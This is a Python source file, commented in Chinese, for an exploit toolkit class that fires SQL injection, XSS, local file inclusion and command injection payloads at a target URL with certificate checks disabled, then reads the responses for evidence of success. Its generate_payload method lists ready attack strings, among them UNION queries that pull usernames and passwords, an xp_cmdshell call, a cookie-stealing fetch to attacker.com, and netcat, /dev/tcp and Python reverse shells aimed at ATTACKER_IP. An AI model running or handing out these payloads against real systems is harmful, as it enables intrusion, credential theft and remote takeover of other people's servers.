"""
漏洞利用相关工具
"""
import asyncio
import aiohttp
import re
import ssl
from typing import Dict, Any, Optional, List
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
import config


class ExploitTools:
    """漏洞利用工具集"""

    def __init__(self):
        self.timeout = aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT)
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

    async def _make_request(
        self,
        url: str,
        method: str = "GET",
        data: Optional[Dict] = None,
        params: Optional[Dict] = None,
        headers: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """发送请求的内部方法"""
        request_headers = {**self.headers, **(headers or {})}
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        try:
            connector = aiohttp.TCPConnector(ssl=ssl_context)
            async with aiohttp.ClientSession(
                timeout=self.timeout,
                connector=connector
            ) as session:
                async with session.request(
                    method=method,
                    url=url,
                    data=data,
                    params=params,
                    headers=request_headers,
                    allow_redirects=False
                ) as response:
                    body = await response.text()
                    return {
                        "success": True,
                        "status_code": response.status,
                        "headers": dict(response.headers),
                        "body": body,
                        "url": str(response.url)
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def sql_injection_test(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        payloads: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        SQL 注入检测

        Args:
            url: 目标 URL
            method: HTTP 方法
            params: GET 参数
            data: POST 数据
            payloads: 自定义 payload 列表

        Returns:
            检测结果
        """
        if payloads is None:
            payloads = config.SQL_PAYLOADS

        vulnerabilities = []
        test_params = params or {}
        test_data = data or {}

        # SQL 错误特征
        sql_errors = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?\Wmysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB)",
            r"PostgreSQL.*?ERROR",
            r"Warning.*?\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"\bSQL Server\b.*?\bDriver",
            r"Warning.*?\W(mssql|sqlsrv)_",
            r"\bSQL Server\b.*?Error",
            r"Oracle.*?Driver",
            r"Warning.*?\W(oci|ora)_",
            r"ORA-[0-9]{5}",
            r"SQLite\/JDBCDriver",
            r"SQLite\.Exception",
            r"(Microsoft|System)\.Data\.SQLite",
            r"Warning.*?\W(sqlite_|SQLite3::)",
            r"SQLITE_ERROR",
            r"SQLite error \d+:",
            r"sqlite3.OperationalError:",
            r"SQLite3::SQLException",
            r"org\.sqlite\.JDBC",
            r"Pdo\.LitePdoAdapter",
            r"SQLiteDatabase",
            r"Unhandled.*?Exception.*?SQL"
        ]

        async def test_param(param_name: str, original_value: str, is_post: bool = False):
            results = []
            for payload in payloads:
                test_value = f"{original_value}{payload}"

                if is_post:
                    modified_data = {**test_data, param_name: test_value}
                    result = await self._make_request(url, "POST", data=modified_data)
                else:
                    modified_params = {**test_params, param_name: test_value}
                    result = await self._make_request(url, "GET", params=modified_params)

                if not result.get("success"):
                    continue

                body = result.get("body", "")

                # 检查 SQL 错误
                for error_pattern in sql_errors:
                    if re.search(error_pattern, body, re.IGNORECASE):
                        results.append({
                            "param": param_name,
                            "payload": payload,
                            "type": "error_based",
                            "evidence": re.search(error_pattern, body, re.IGNORECASE).group()[:100],
                            "method": "POST" if is_post else "GET"
                        })
                        break

            return results

        # 测试 GET 参数
        for param_name, value in test_params.items():
            vuln_results = await test_param(param_name, value, is_post=False)
            vulnerabilities.extend(vuln_results)

        # 测试 POST 参数
        for param_name, value in test_data.items():
            vuln_results = await test_param(param_name, value, is_post=True)
            vulnerabilities.extend(vuln_results)

        # 基于时间的盲注测试
        time_based_payloads = [
            "' AND SLEEP(3)--",
            "' OR SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
        ]

        for param_name, value in {**test_params, **test_data}.items():
            for payload in time_based_payloads:
                test_value = f"{value}{payload}"

                import time
                start_time = time.time()

                if param_name in test_data:
                    modified_data = {**test_data, param_name: test_value}
                    result = await self._make_request(url, "POST", data=modified_data)
                else:
                    modified_params = {**test_params, param_name: test_value}
                    result = await self._make_request(url, "GET", params=modified_params)

                elapsed = time.time() - start_time

                if elapsed >= 2.5:  # 响应延迟超过 2.5 秒
                    vulnerabilities.append({
                        "param": param_name,
                        "payload": payload,
                        "type": "time_based_blind",
                        "evidence": f"Response delayed by {elapsed:.2f} seconds",
                        "method": "POST" if param_name in test_data else "GET"
                    })
                    break  # 发现一个就够了

        return {
            "success": True,
            "url": url,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "tested_params": list(test_params.keys()) + list(test_data.keys())
        }

    async def xss_test(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        payloads: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        XSS 漏洞检测

        Args:
            url: 目标 URL
            method: HTTP 方法
            params: GET 参数
            data: POST 数据
            payloads: 自定义 payload 列表

        Returns:
            检测结果
        """
        if payloads is None:
            payloads = config.XSS_PAYLOADS

        vulnerabilities = []
        test_params = params or {}
        test_data = data or {}

        async def test_param(param_name: str, original_value: str, is_post: bool = False):
            results = []
            for payload in payloads:
                test_value = f"{original_value}{payload}"

                if is_post:
                    modified_data = {**test_data, param_name: test_value}
                    result = await self._make_request(url, "POST", data=modified_data)
                else:
                    modified_params = {**test_params, param_name: test_value}
                    result = await self._make_request(url, "GET", params=modified_params)

                if not result.get("success"):
                    continue

                body = result.get("body", "")

                # 检查 payload 是否被反射
                if payload in body:
                    results.append({
                        "param": param_name,
                        "payload": payload,
                        "type": "reflected",
                        "evidence": "Payload reflected in response",
                        "method": "POST" if is_post else "GET"
                    })

            return results

        # 测试所有参数
        for param_name, value in test_params.items():
            vuln_results = await test_param(param_name, value, is_post=False)
            vulnerabilities.extend(vuln_results)

        for param_name, value in test_data.items():
            vuln_results = await test_param(param_name, value, is_post=True)
            vulnerabilities.extend(vuln_results)

        return {
            "success": True,
            "url": url,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "tested_params": list(test_params.keys()) + list(test_data.keys())
        }

    async def lfi_test(
        self,
        url: str,
        param: str,
        payloads: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        本地文件包含 (LFI) 漏洞检测

        Args:
            url: 目标 URL
            param: 待测试的参数名
            payloads: 自定义 payload 列表

        Returns:
            检测结果
        """
        if payloads is None:
            payloads = [
                "../etc/passwd",
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "....//....//....//....//etc/passwd",
                "/etc/passwd",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
                "/etc/passwd%00",
                "../../../etc/passwd%00.php",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
            ]

        vulnerabilities = []

        # LFI 成功的特征
        lfi_indicators = [
            r"root:.*?:0:0:",  # /etc/passwd
            r"\[extensions\]",  # php.ini
            r"# Host Database",  # /etc/hosts
            r"localhost",
            r"127\.0\.0\.1",
        ]

        for payload in payloads:
            result = await self._make_request(url, "GET", params={param: payload})

            if not result.get("success"):
                continue

            body = result.get("body", "")

            for indicator in lfi_indicators:
                if re.search(indicator, body):
                    vulnerabilities.append({
                        "param": param,
                        "payload": payload,
                        "type": "lfi",
                        "evidence": re.search(indicator, body).group()[:100]
                    })
                    break

        return {
            "success": True,
            "url": url,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities
        }

    async def command_injection_test(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """
        命令注入漏洞检测

        Args:
            url: 目标 URL
            method: HTTP 方法
            params: GET 参数
            data: POST 数据

        Returns:
            检测结果
        """
        payloads = [
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
            "| dir",
            "& dir",
            "; ls -la",
            "| ls -la",
        ]

        # 命令执行成功的特征
        cmd_indicators = [
            r"uid=\d+\(\w+\)",  # id 命令
            r"root:.*?:0:0:",   # /etc/passwd
            r"gid=\d+",
            r"groups=\d+",
            r"Directory of",    # Windows dir
            r"total \d+",       # ls 输出
            r"drwx",            # ls 输出
        ]

        vulnerabilities = []
        test_params = params or {}
        test_data = data or {}

        async def test_param(param_name: str, original_value: str, is_post: bool = False):
            results = []
            for payload in payloads:
                test_value = f"{original_value}{payload}"

                if is_post:
                    modified_data = {**test_data, param_name: test_value}
                    result = await self._make_request(url, "POST", data=modified_data)
                else:
                    modified_params = {**test_params, param_name: test_value}
                    result = await self._make_request(url, "GET", params=modified_params)

                if not result.get("success"):
                    continue

                body = result.get("body", "")

                for indicator in cmd_indicators:
                    if re.search(indicator, body):
                        results.append({
                            "param": param_name,
                            "payload": payload,
                            "type": "command_injection",
                            "evidence": re.search(indicator, body).group()[:100],
                            "method": "POST" if is_post else "GET"
                        })
                        break

            return results

        for param_name, value in test_params.items():
            vuln_results = await test_param(param_name, value, is_post=False)
            vulnerabilities.extend(vuln_results)

        for param_name, value in test_data.items():
            vuln_results = await test_param(param_name, value, is_post=True)
            vulnerabilities.extend(vuln_results)

        return {
            "success": True,
            "url": url,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities
        }

    async def generate_payload(
        self,
        vuln_type: str,
        target_db: str = "mysql",
        context: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        生成漏洞利用 Payload

        Args:
            vuln_type: 漏洞类型 (sqli, xss, lfi, rce)
            target_db: 目标数据库类型
            context: 上下文信息

        Returns:
            生成的 payload 列表
        """
        payloads = []

        if vuln_type == "sqli":
            if target_db == "mysql":
                payloads = [
                    # 信息获取
                    "' UNION SELECT @@version,NULL--",
                    "' UNION SELECT user(),database()--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                    # 数据提取
                    "' UNION SELECT username,password FROM users--",
                    # 绕过技术
                    "' OR '1'='1'--",
                    "admin'--",
                    "' OR ''='",
                ]
            elif target_db == "mssql":
                payloads = [
                    "' UNION SELECT @@version,NULL--",
                    "'; EXEC xp_cmdshell('whoami')--",
                    "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
                ]
            elif target_db == "postgresql":
                payloads = [
                    "' UNION SELECT version(),NULL--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                ]

        elif vuln_type == "xss":
            payloads = [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(document.domain)>",
                "<svg/onload=alert(document.domain)>",
                "'\"><script>alert(document.domain)</script>",
                "<body onload=alert(document.domain)>",
                "javascript:alert(document.domain)",
                "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",
            ]

        elif vuln_type == "lfi":
            payloads = [
                "php://filter/convert.base64-encode/resource=../config.php",
                "php://filter/convert.base64-encode/resource=../includes/db.php",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "/var/log/apache2/error.log",
            ]

        elif vuln_type == "rce":
            payloads = [
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; nc -e /bin/bash ATTACKER_IP 4444",
                "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            ]

        return {
            "success": True,
            "vuln_type": vuln_type,
            "target_db": target_db,
            "payload_count": len(payloads),
            "payloads": payloads
        }
